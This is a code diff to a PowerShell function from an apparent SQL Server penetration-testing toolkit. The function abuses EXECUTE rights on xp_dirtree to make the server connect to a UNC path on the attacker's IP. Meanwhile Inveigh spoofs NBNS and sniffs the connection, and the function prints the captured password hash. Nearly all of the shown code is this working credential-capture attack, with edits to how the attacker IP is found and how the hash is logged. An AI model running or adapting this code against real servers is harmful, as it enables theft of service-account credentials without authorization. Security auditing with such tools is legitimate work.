@@ -9417,7 +9417,7 @@ Function Invoke-SQLAuditPrivXpDirtree{
         if($DirTreePrivs){
 
             # Status user
-            Write-Verbose "$Instance : - The $PrincipalName principal has EXECUTE privileges on XP_DIRTREE."  
+            Write-Verbose "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_dirtree."  
 
             $IsVulnerable  = "Yes"             
             $DirTreePrivs | 
@@ -9447,34 +9447,26 @@ Function Invoke-SQLAuditPrivXpDirtree{
                                 Write-Verbose "$Instance : - Inveigh loaded." 
 
                                 # Get IP of SQL Server instance
-                                $InstanceIP = Resolve-DnsName $ComputerName | select IPaddress -ExpandProperty ipaddress 
+                                $InstanceIP = Resolve-DnsName $ComputerName | Select-Object IPaddress -ExpandProperty ipaddress 
                                 
                                 # Start sniffing for hashes from that IP
                                 Write-Verbose "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
+                                Invoke-Inveigh -SpooferHostsReply $InstanceIP -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null
 
                                 # Get IP of current system
                                 if(-not $AttackerIp){
 
-                                    # Send query for each local ipv4 IP
-                                    Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPV4" -and $_.IPAddress -ne "127.0.0.1"} | 
-                                    ForEach-Object{
+                                     $AttackerIp = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address | Select-Object IPAddressToString -ExpandProperty IPAddressToString)
+                                }
 
-                                        $TargetIP = $_.IPAddress
-
-                                        # Sent unc path to attackers
-                                        Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$TargetIP\path'" -TimeOut 1 -SuppressVerbose
-                                    }
-                                }else{
-
-                                    # Sent unc path to attacker's Ip
-                                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 1 -SuppressVerbose
-                                } 
+                                # Sent unc path to attacker's Ip
+                                Write-Verbose "$Instance : - Inject UNC path to \\$AttackerIP\path..."
+                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 2 -SuppressVerbose                                
                                 
                                 # Stop sniffing and print password hashes
                                 sleep $Timeout
                                 Stop-Inveigh | Out-Null 
-                                Write-Verbose "$Instance : - Stopped sniffing..." 
+                                Write-Verbose "$Instance : - Stopped sniffing." 
                                 
                                 $HashType =  ""
                                 $Hash = ""
@@ -9499,7 +9491,9 @@ Function Invoke-SQLAuditPrivXpDirtree{
                                 
                                 if($Hash){
 
-                                     # Update Status    
+                                    # Update Status    
+                                    Write-Verbose "$Instance : - Recovered $HashType hash:" 
+                                    Write-Verbose "$Instance : - $Hash"
                                     $Exploited = "Yes"
                                     $Details = "$Instance : - The $PrincipalName has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
                                 }else{
